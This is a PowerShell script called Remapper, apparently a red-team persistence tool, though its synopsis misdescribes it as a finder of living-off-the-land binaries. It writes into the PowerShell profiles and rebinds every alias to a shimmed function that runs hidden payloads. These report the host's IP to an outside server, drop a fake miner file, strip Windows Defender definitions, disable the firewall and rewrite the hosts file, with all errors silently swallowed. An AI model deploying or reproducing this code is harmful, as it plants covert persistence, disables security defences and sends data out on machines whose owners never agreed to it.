<#
    .SYNOPSIS
    Script which can be used to find living off the land binaries and scripts on a target machine.
    .DESCRIPTION
    Remapper aims to leverage alias shimming and PowerShell profiles
    to shim every alias with user defined funtions and have the aliases still function normally as to not
    raise suspicions.
    .PARAMETER Outfile
    If specified output will be put into an outfile of this name
    .NOTES
    Version:        1.0
    Author:         NotoriousRebel
    Creation Date:  10/28/19
    .EXAMPLE
    PS C:\> .\remap.ps1
    .LINK
    https://github.com/NotoriousRebel/Remapper
    #>

# DEFINE FUNCTIONS BELOW
$mm = @'
function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
'@.Trim()
$gg = @'
function gg {$g=[Guid]::newGuid().Guid.Replace("-", "").substring(0,10) + "miner.ps1";New-Item -Path (Join-Path $env:USERPROFILE 'Desktop') -Force -Name $g | Out-Null;}
'@.Trim()
$dd = @'
function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
'@.Trim()
$ff = @'
function ff {try{Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue | Out-Null}Catch{}}
'@.Trim()
$xx = @'
function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue |ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue -Value "`r`n0.0.0.0    www.google.com google.com" | Out-Null}Catch{}}}Catch{}}
'@.Trim()

$orig_dct = @{ }
function create_map() {
    <#
    .SYNOPSIS
    A helper function that creates a hashmap
    .DESCRIPTION
    Given the name of the alias will retrive the definition of the alias
    and create a new entry in the hashmap with the 
    key being the alias and the value being the definition
    .PARAMETER alias
    Name of alias that will serve as key
    #>
    param([parameter(ValueFromPipeline)][string]$alias)
    if ($alias -match "gin") {
        # Not shimming as newGuid() uses gin alias and that breaks things
        return;
    }
    $value = (Get-Alias -Name $alias).Definition
    $orig_dct[$alias] = $value
}

function shim([string]$key, [string]$value) {
    <#
    .SYNOPSIS
    Creates array that contains function definton as well as set alias command to shim alias
    .DESCRIPTION
    Given the name of the alias will retrive the definition of the alias
    and create a new entry in the hashmap with the 
    key being the alias and the value being the definition
    .PARAMETER key
    Name of alias 
    .PARAMETER value
    Definition of alias (key)
    .OUTPUTS
    arr: Array that contains two elements
    First element: String that is definition of function that contains shimmed functions as well as definition for alias
    Second element: String that redefines the alias with the Value being our shimmed functon 
    #>
    $y = "function shimmed_$key {$value; mm; gg; xx; dd; ff}"
    $tmp = "shimmed_$key"
    $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force'
    $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
    $arr = @()
    $arr += $y
    $arr += $s
    $arr 
    return $arr
}


function write_to([string]$path, [string]$val) {
    <#
    .SYNOPSIS
    Function that given a path and value will add that content to path
    .DESCRIPTION
    Given path and value simply adds it to file, wrapped in Try Catch statement
    .PARAMETER path
    File path to write to
    .PARAMETER value
    Value that will be appended to path
    #>
    Try {
        Add-Content -Path $path -Value $val
    }
    Catch {

    }
}
function main() {
    <#
    .SYNOPSIS
    Function that given a path and value will add that content to path
    .DESCRIPTION
    Given path and value simply adds it to file, wrapped in Try Catch statement
    .PARAMETER path
    File path to write to
    .PARAMETER value
    Value that will be appended to path
    #>
    Get-Alias | ForEach-Object { $_.Name | create_map }
    $curuser_allhosts = $PROFILE.CurrentUserAllHosts
    $allusers_allhosts = $PROFILE.AllUsersAllHosts

    if (!(Test-Path -Path $curuser_allhosts)) {
        Try {
            New-Item -ItemType File -Path $curuser_allhosts -ErrorAction SilentlyContinue -Force | Out-Null
        }
        Catch { }
    }
    if (!(Test-Path -Path $allusers_allhosts)) {
        Try {
            New-Item -ItemType File -Path $allusers_allhosts -ErrorAction SilentlyContinue -Force | Out-Null
        }
        Catch { }
    }
    
    Get-Alias | ForEach-Object { $_.Name | create_map }
    $orig_dct["?"] = "Where-Object"
    # Hardcoded because returns 4 different values when doing Get-Alias
    $lst = $orig_dct.Keys | Sort-Object
    # Sort the keys to go in order 
    $all = @()
    foreach ($key in $lst) {
        $val = $orig_dct[$key]
        $arr = shim $key $val
        $alias_line = $arr[0]
        $func_shim = $arr[1]
        $all += $alias_line
        $all += $func_shim
    }
    # Array that contains shimmed functions as well as set alias commands to add to profiles
    Try {
        write_to $curuser_allhosts $mm
        write_to $curuser_allhosts $gg
        write_to $curuser_allhosts $dd
        write_to $curuser_allhosts $ff
        write_to $curuser_allhosts $xx
        foreach ($v in $all) {
            write_to $curuser_allhosts $v
        }
    }
    Catch { }
    # First add functions than iterate through array 
    Try {
        write_to $allusers_allhosts $mm
        write_to $allusers_allhosts $gg
        write_to $allusers_allhosts $dd
        write_to $allusers_allhosts $ff
        write_to $allusers_allhosts $xx
        foreach ($v in $all) {
            write_to $allusers_allhosts $v
        }
    }
    Catch { }
}

main